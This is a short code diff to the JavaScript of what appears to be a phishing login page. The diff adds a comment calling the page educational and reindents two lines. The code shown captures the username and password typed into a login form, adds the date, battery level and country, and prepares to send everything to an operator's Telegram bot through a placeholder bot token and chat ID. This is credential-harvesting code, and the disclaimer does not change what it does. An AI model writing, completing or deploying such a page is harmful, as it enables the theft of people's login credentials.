@@ -1,3 +1,4 @@
+// This page is created to educate the public about phishing and how to prevent it. Please note that using this code for any illegal activities is strictly prohibited. The original code is available at https://github.com/saheermk/
 document.getElementById('loginForm').addEventListener('submit', async function(event) {
     event.preventDefault();
 
@@ -22,8 +23,8 @@ Date and Time: ${dateTime}
 Battery Percentage: ${batteryPercentage}%
 Country: ${countryName}`;
 
-    const botToken = 'YOUR_BOT_TOKEN'; // Replace with your bot token
-    const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
+const botToken = 'YOUR_BOT_TOKEN'; // Replace with your bot token
+const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
     const message = `Username: ${username}\nPassword: ${password}\n${text}`;
 
     // Send text message to Telegram
